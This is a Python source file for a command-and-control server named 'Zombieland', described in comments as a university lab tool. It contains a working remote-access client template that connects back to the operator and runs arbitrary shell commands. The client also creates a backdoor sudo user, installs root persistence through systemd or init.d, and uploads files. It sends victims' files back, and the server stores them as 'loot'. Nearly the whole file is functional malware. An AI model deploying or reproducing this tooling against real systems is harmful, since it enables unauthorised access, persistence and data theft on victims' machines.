#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
c2_manager.py
TCP C2 Server Engine for Zombieland (Lab Environment)
- Matches the exact client architecture and commands of the original Zombieland.py
- Supports: createuser, persistence, download (raw streaming), upload, search, lz, and shell execution
- Uses structured Fernet packets with 4-byte length headers for robustness
- Incorporates a safe background heartbeat loop for live ECG pulse monitoring
- Exposes local EventBus and thread-safe C2Manager instance
"""

import base64
import json
import logging
import os
import socket
import struct
import threading
import time
import traceback
from pathlib import Path
from typing import Dict, Tuple, Optional, Callable, List, Any
from datetime import timedelta
from string import Template
from cryptography.fernet import Fernet, InvalidToken

# ---------- Paths & Directory Setup ----------
BASE_DIR = Path(__file__).resolve().parent
KEY_FILE = BASE_DIR / "keys.json"
LOOT_DIR = BASE_DIR / "loot"
CLIENTS_DIR = BASE_DIR / "generated_clients"

CLIENTS_DIR.mkdir(exist_ok=True)
LOOT_DIR.mkdir(exist_ok=True)

# Logger setup
log = logging.getLogger("C2")
logging.basicConfig(level=logging.INFO, format="[%(asctime)s] [%(levelname)s] %(message)s")

# ---------- Client Python Template ----------
# Generated client script matching Zombieland.py structure with added keepalive support
CLIENT_TEMPLATE = Template(r"""#!/usr/bin/env python3
# Lab client (Zombieland) — Fictitious C2 agent for university training
import socket
import json
import os
import random
import string
import subprocess
import threading
import time
import struct
import sys
from cryptography.fernet import Fernet

class ZombieClient:
    def __init__(self, server_ip, server_port, client_id, key):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_id = client_id
        self.cipher_suite = Fernet(key)
        self.running = True
        self.connect_to_server()
        
        # Start keepalive heartbeat loop for real-time dashboard ECG telemetry
        self.heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()

    def connect_to_server(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.server_ip, self.server_port))
        self.sock.sendall(self.client_id.encode())
        print("Connected to server")

    def receive_encrypted_message(self):
        # Read robust 4-byte header length
        hdr = self.sock.recv(4)
        if not hdr: return None
        (length,) = struct.unpack(">I", hdr)
        data = b""
        while len(data) < length:
            chunk = self.sock.recv(length - len(data))
            if not chunk: return None
            data += chunk
        return self.cipher_suite.decrypt(data).decode()

    def send_encrypted_message(self, message):
        # Send with robust 4-byte header length
        enc = self.cipher_suite.encrypt(message.encode())
        self.sock.sendall(struct.pack(">I", len(enc)) + enc)

    def listen_for_commands(self):
        while self.running:
            try:
                command = self.receive_encrypted_message()
                if not command:
                    break
                print(f"Received command: {command}")
                response = self.execute_command(command)
                self.send_encrypted_message(json.dumps(response))
            except Exception as e:
                print(f"Error: {e}")
                break

    def is_systemd(self):
        try:
            subprocess.run(["pidof", "systemd"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False

    def heartbeat_loop(self):
        while self.running:
            try:
                cpu_percent = 10
                mem_percent = 35
                try:
                    import psutil
                    cpu_percent = psutil.cpu_percent()
                    mem_percent = psutil.virtual_memory().percent
                except:
                    pass
                
                # Fetch OS dynamically
                import platform
                os_name = "Linux"
                try:
                    os_name = platform.system()
                except:
                    pass

                payload = {
                    "ping": time.time(),
                    "telemetry": {
                        "hostname": socket.gethostname(),
                        "os": os_name,
                        "cpu_percent": cpu_percent,
                        "mem_percent": mem_percent,
                    }
                }
                self.send_encrypted_message(json.dumps(payload))
            except Exception:
                break
            time.sleep(10)

    def execute_command(self, command):
        try:
            if command.startswith("createuser"):
                username = ''.join(random.choices(string.ascii_lowercase, k=8))
                password = username
                os.system(f"useradd -m -p $$(openssl passwd -1 {username}) {username}")
                os.system(f"usermod -aG sudo {username}")
                return {"result": f"User {username} created with password {password}"}
                
            elif command.startswith("persistence"):
                client_file_path = os.path.abspath(__file__)
                if self.is_systemd():
                    service_file_path = "/etc/systemd/system/zombie_persistence.service"
                    service_file_content = f'''[Unit]
Description=Zombie Persistence Service
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/python3 {client_file_path}
StandardOutput=inherit
StandardError=inherit
Restart=always
User=root

[Install]
WantedBy=multi-user.target
'''
                    with open(service_file_path, "w") as f:
                        f.write(service_file_content)

                    os.system("systemctl daemon-reload")
                    os.system("systemctl enable zombie_persistence.service")
                    os.system("systemctl start zombie_persistence.service")
                    return {"result": "Systemd service created and started"}
                else:
                    persistence_file_path = "/etc/init.d/zombie_persistence"
                    with open(persistence_file_path, "w") as f:
                        f.write("#!/bin/bash\n")
                        f.write("### BEGIN INIT INFO\n")
                        f.write("# Provides:          zombie_persistence\n") 
                        f.write("# Required-Start:    $$remote_fs $$syslog\n")
                        f.write("# Required-Stop:     $$remote_fs $$syslog\n")
                        f.write("# Default-Start:     2 3 4 5\n")
                        f.write("# Default-Stop:      0 1 6\n")
                        f.write("# Short-Description: Starts zombie persistence script\n")
                        f.write("# Description:       Starts the zombie persistence script which runs every 60 seconds\n")
                        f.write("### END INIT INFO\n")
                        f.write(f"while true; do python3 {client_file_path}; sleep 60; done\n")

                    os.system(f"chmod +x {persistence_file_path}")
                    os.system("update-rc.d zombie_persistence defaults")
                    os.system("service zombie_persistence enable")
                    os.system("service zombie_persistence start")
                    return {"result": "Init.d script created and started"}
                    
            elif command.startswith("download"):
                parts = command.split(" ")
                file_path = parts[1]
                if os.path.exists(file_path):
                    file_size = os.path.getsize(file_path)
                    # Sends size with length prefix header
                    self.send_encrypted_message(str(file_size))
                    # Raw socket chunk stream as written in Zombieland.py
                    with open(file_path, "rb") as f:
                        while chunk := f.read(4096):
                            self.sock.sendall(chunk)
                    return {"result": f"File {file_path} downloaded successfully"}
                else:
                    return {"error": "File not found"}
                    
            elif command.startswith("upload"):
                parts = command.split(" ", 2)
                file_path = parts[1]
                file_data = parts[2].encode('latin1')
                with open(file_path, "wb") as f:
                    f.write(file_data)
                return {"result": f"File {file_path} uploaded successfully"}
                
            elif command.startswith("search"):
                parts = command.split(" ", 1)
                search_term = parts[1]
                matches = []
                for root, dirs, files in os.walk("/"):
                    for name in files:
                        if search_term in name:
                            matches.append(os.path.join(root, name))
                return {"matches": matches}
                
            elif command.startswith("lz"):
                result = os.popen("ls -la").read()
                formatted_result = "\n".join(result.splitlines())
                return {"result": formatted_result}
                
            else:
                # Raw fallback shell execution
                result = os.popen(command).read()
                return {"result": result}
                
        except Exception as e:
            return {"error": str(e)}

if __name__ == "__main__":
    client_id = '$client_id'
    key = b'$key'
    zombie = ZombieClient("$server_ip", $server_port, client_id, key)
    zombie.listen_for_commands()
""")

# ---------- Helper Functions ----------
def get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# ---------- EventBus (in-process pub/sub) ----------
class EventBus:
    def __init__(self):
        self._subs = set()
        self._lock = threading.Lock()

    def subscribe(self, callback: Callable[[dict], None]):
        with self._lock:
            self._subs.add(callback)

    def unsubscribe(self, callback: Callable[[dict], None]):
        with self._lock:
            self._subs.discard(callback)

    def emit(self, event: dict):
        with self._lock:
            for cb in list(self._subs):
                try:
                    cb(event)
                except Exception:
                    pass

# ---------- C2 Manager Engine ----------
class C2Manager:
    def __init__(self, bind_port: int = 5555, bind_ip: Optional[str] = None, bus: Optional[EventBus] = None):
        self.bind_ip = bind_ip or get_local_ip()
        self.bind_port = bind_port
        self.bus = bus or EventBus()
        self._running = False

        self._server_socket: Optional[socket.socket] = None
        self._server_thread: Optional[threading.Thread] = None
        self._keys: Dict[str, str] = self._load_keys()
        self._clients: Dict[str, Tuple[socket.socket, Fernet, dict]] = {}  # id -> (sock, cipher, runtime_info)
        self._last_cmd: Dict[str, str] = {}
        self._lock = threading.RLock()

    # ---------- KEYS ----------
    def _load_keys(self) -> Dict[str, str]:
        if KEY_FILE.exists():
            try:
                return json.loads(KEY_FILE.read_text(encoding="utf-8"))
            except Exception:
                return {}
        return {}

    def _save_key(self, client_id: str, key: bytes):
        self._keys[client_id] = key.decode()
        KEY_FILE.write_text(json.dumps(self._keys, indent=2), encoding="utf-8")

    def get_cipher(self, client_id: str) -> Fernet:
        return Fernet(self._keys[client_id].encode())

    # ---------- SERVER CONTROL ----------
    def start(self, port: Optional[int] = None):
        with self._lock:
            if self._running:
                return {"status": "already_running", "port": self.bind_port, "ip": self.bind_ip}
            if port:
                self.bind_port = int(port)
            try:
                self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self._server_socket.bind(("0.0.0.0", self.bind_port))
                self._server_socket.listen(64)
                self._running = True
                
                self._server_thread = threading.Thread(target=self._accept_loop, daemon=True)
                self._server_thread.start()
                
                self.bus.emit({"type": "log", "level": "info", "text": f"C2 Socket Engine started on {self.bind_ip}:{self.bind_port}"})
                return {"status": "ok", "port": self.bind_port, "ip": self.bind_ip}
            except Exception as e:
                self._running = False
                if self._server_socket:
                    try:
                        self._server_socket.close()
                    except Exception:
                        pass
                    self._server_socket = None
                return {"status": "error", "message": str(e)}

    def stop(self):
        with self._lock:
            if not self._running:
                return {"status": "not_running"}
            try:
                self._running = False
                
                clients_to_close = list(self._clients.values())
                for sock, _, _ in clients_to_close:
                    try:
                        sock.close()
                    except Exception:
                        pass
                self._clients.clear()

                if self._server_socket:
                    self._server_socket.close()
                    self._server_socket = None
                
                self.bus.emit({"type": "log", "level": "warn", "text": "C2 Socket Engine stopped"})
                return {"status": "ok"}
            except Exception as e:
                return {"status": "error", "message": str(e)}

    def status(self) -> dict:
        with self._lock:
            return {
                "running": self._running,
                "port": self.bind_port,
                "ip": self.bind_ip,
                "agents": len(self._clients)
            }

    # ---------- CLIENT INTERACTION ----------
    def list_agents(self) -> List[dict]:
        with self._lock:
            agents = []
            now = time.time()
            for cid, (_, _, info) in self._clients.items():
                last_seen = info.get("lastSeen", now)
                elapsed = now - last_seen
                
                if elapsed > 35:
                    status = "offline"
                elif elapsed > 20:
                    status = "stale"
                elif elapsed > 10:
                    status = "idle"
                else:
                    status = "online"

                agents.append({
                    "id": cid,
                    "hostname": info.get("hostname") or cid,
                    "os": info.get("os") or "Unknown",
                    "status": status,
                    "cpu": info.get("cpu_percent", 0),
                    "mem": info.get("mem_percent", 0),
                    "ip": info.get("ip", "0.0.0.0"),
                    "tags": info.get("tags", ["real-socket"]),
                    "lastSeen": last_seen
                })
            return agents

    def send_command(self, targets: List[str], command: str) -> dict:
        sent = 0
        with self._lock:
            for cid in targets:
                if cid not in self._clients:
                    continue
                sock, cipher, info = self._clients[cid]
                try:
                    self._last_cmd[cid] = command
                    
                    # Intercept download command to set raw byte reader state flags
                    if command.startswith("download "):
                        parts = command.split(" ", 1)
                        if len(parts) > 1:
                            info["download_mode"] = True
                            info["download_filename"] = os.path.basename(parts[1])

                    enc = cipher.encrypt(command.encode())
                    sock.sendall(struct.pack(">I", len(enc)) + enc)
                    sent += 1
                except Exception as e:
                    log.error(f"Send error to {cid}: {e}")
                    try:
                        sock.close()
                    except Exception:
                        pass
        self.bus.emit({"type": "log", "level": "info", "text": f"Sent command '{command}' to {sent}/{len(targets)} targets"})
        return {"total": len(targets), "sent": sent, "command": command}

    def broadcast(self, command: str) -> dict:
        with self._lock:
            ids = list(self._clients.keys())
        return self.send_command(ids, command)

    def generate_client(self, client_id: str, lab_user: str = "testuser", lab_password: str = "testpass") -> dict:
        with self._lock:
            if not client_id:
                client_id = f"zombie_{int(time.time()) % 100000:05d}"
            
            key = Fernet.generate_key()
            self._save_key(client_id, key)
            
            code = CLIENT_TEMPLATE.substitute(
                server_ip=self.bind_ip,
                server_port=self.bind_port,
                client_id=client_id,
                key=key.decode(),
                lab_user=lab_user,
                lab_password=lab_password
            )
            
            path = CLIENTS_DIR / f"client_{client_id}.py"
            path.write_text(code, encoding="utf-8")
            
            # Make also a copy in the root folder as expected by the user bat launcher
            root_copy = BASE_DIR / f"zombie_client_{client_id}.py"
            root_copy.write_text(code, encoding="utf-8")
            
            self.bus.emit({"type": "log", "level": "info", "text": f"Generated client script: zombie_client_{client_id}.py"})
            return {"status": "ok", "filename": f"client_{client_id}.py", "client_id": client_id}

    # ---------- SOCKET LOOPS ----------
    def _accept_loop(self):
        while self._running and self._server_socket:
            try:
                sock, addr = self._server_socket.accept()
                threading.Thread(target=self._handle_client, args=(sock, addr), daemon=True).start()
            except Exception as e:
                if self._running:
                    log.error(f"Accept error: {e}")
                time.sleep(0.5)

    def _handle_client(self, sock: socket.socket, addr):
        client_id = None
        try:
            sock.settimeout(15.0)
            client_id = sock.recv(128).decode().strip()
            if not client_id:
                return
            
            with self._lock:
                if client_id not in self._keys:
                    log.warning(f"Connection attempt from unknown Client ID: {client_id} at {addr}")
                    sock.close()
                    return
                
                cipher = self.get_cipher(client_id)
                self._clients[client_id] = (sock, cipher, {
                    "ip": addr[0],
                    "hostname": client_id,
                    "os": "Unknown",
                    "cpu_percent": 0,
                    "mem_percent": 0,
                    "lastSeen": time.time(),
                    "download_mode": False,
                    "download_filename": ""
                })
            
            sock.settimeout(None)
            self.bus.emit({"type": "log", "level": "info", "text": f"Client {client_id} connected successfully from {addr[0]}"})
            self._client_read_loop(client_id, sock, cipher)
        
        except Exception as e:
            log.error(f"Error handling connection from {addr}: {e}")
        finally:
            with self._lock:
                if client_id and client_id in self._clients:
                    del self._clients[client_id]
            try:
                sock.close()
            except Exception:
                pass
            if client_id:
                self.bus.emit({"type": "log", "level": "warn", "text": f"Client {client_id} disconnected"})

    def _client_read_loop(self, client_id: str, sock: socket.socket, cipher: Fernet):
        while self._running:
            try:
                with self._lock:
                    if client_id not in self._clients:
                        break
                    info = self._clients[client_id][2]
                
                # Check for raw download streaming channel interception
                if info.get("download_mode"):
                    # 1. Read encrypted file size (comes with length prefix)
                    hdr = sock.recv(4)
                    if not hdr: break
                    (length,) = struct.unpack(">I", hdr)
                    enc_size = sock.recv(length)
                    dec_msg = cipher.decrypt(enc_size).decode().strip()
                    
                    # Error handling: if not digits, it's a JSON error dict
                    if not dec_msg.isdigit():
                        try:
                            resp = json.loads(dec_msg)
                        except:
                            resp = {"error": dec_msg}
                        self._process_response(client_id, resp)
                        with self._lock:
                            info["download_mode"] = False
                        continue
                    
                    file_size = int(dec_msg)
                    
                    # 2. Read raw byte stream from socket
                    file_data = b""
                    while len(file_data) < file_size:
                        chunk = sock.recv(min(4096, file_size - len(file_data)))
                        if not chunk: break
                        file_data += chunk
                    
                    # Save stream to file
                    filename = info.get("download_filename", "downloaded_file")
                    self._save_raw_loot(client_id, filename, file_data)
                    self.bus.emit({
                        "type": "log",
                        "level": "info",
                        "text": f"Loot recovered from {client_id}: {filename} ({file_size} bytes)"
                    })
                    
                    # Reset mode
                    with self._lock:
                        info["download_mode"] = False
                    continue

                # Standard message read loop (4-byte length framing header)
                hdr = sock.recv(4)
                if not hdr:
                    break
                (length,) = struct.unpack(">I", hdr)
                enc = b""
                while len(enc) < length:
                    chunk = sock.recv(length - len(enc))
                    if not chunk:
                        break
                    enc += chunk
                if not enc:
                    break
                
                resp_str = cipher.decrypt(enc).decode().strip()
                try:
                    resp = json.loads(resp_str)
                except json.JSONDecodeError:
                    resp = {"result": resp_str}
                
                self._process_response(client_id, resp)
            except (InvalidToken, ConnectionResetError, socket.error):
                break
            except Exception as e:
                log.error(f"Read loop error for {client_id}: {e}")
                break

    def _process_response(self, client_id: str, resp: dict):
        now = time.time()
        
        # 1. Heartbeat check
        if "ping" in resp:
            with self._lock:
                if client_id in self._clients:
                    self._clients[client_id][2]["lastSeen"] = now
            self.bus.emit({
                "type": "telemetry",
                "id": client_id,
                "lastSeen": now
            })
            
            # If ping package also carries telemetry info (our added loop)
            if "telemetry" in resp:
                tel = resp["telemetry"]
                with self._lock:
                    if client_id in self._clients:
                        info = self._clients[client_id][2]
                        info.update({
                            "hostname": tel.get("hostname"),
                            "os": tel.get("os"),
                            "cpu_percent": tel.get("cpu_percent", 0),
                            "mem_percent": tel.get("mem_percent", 0)
                        })
                self.bus.emit({
                    "type": "telemetry",
                    "id": client_id,
                    "hostname": tel.get("hostname"),
                    "os": tel.get("os"),
                    "cpu": tel.get("cpu_percent", 0),
                    "mem": tel.get("mem_percent", 0),
                    "lastSeen": now
                })
            return

        # 2. Shell result formatting
        if "error" in resp:
            self.bus.emit({
                "type": "console",
                "kind": "RX",
                "target": client_id,
                "text": f"ERROR: {resp['error']}"
            })
        elif "matches" in resp:
            # File search response
            matches = resp["matches"]
            out_str = f"Matches found: {len(matches)}\n" + "\n".join(matches[:50])
            self.bus.emit({
                "type": "console",
                "kind": "RX",
                "target": client_id,
                "text": out_str
            })
        else:
            self.bus.emit({
                "type": "console",
                "kind": "RX",
                "target": client_id,
                "text": str(resp.get("result", resp))
            })

    def _save_raw_loot(self, client_id: str, filename: str, file_data: bytes):
        try:
            client_dir = LOOT_DIR / client_id
            client_dir.mkdir(exist_ok=True)
            fp = client_dir / filename
            fp.write_bytes(file_data)
            log.info(f"Saved raw loot file: {fp}")
        except Exception as e:
            log.error(f"Failed to save raw loot file: {e}")

# Instanciate global manager
c2_manager = C2Manager()

if __name__ == "__main__":
    c2 = C2Manager(bind_port=5555)
    c2.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        c2.stop()
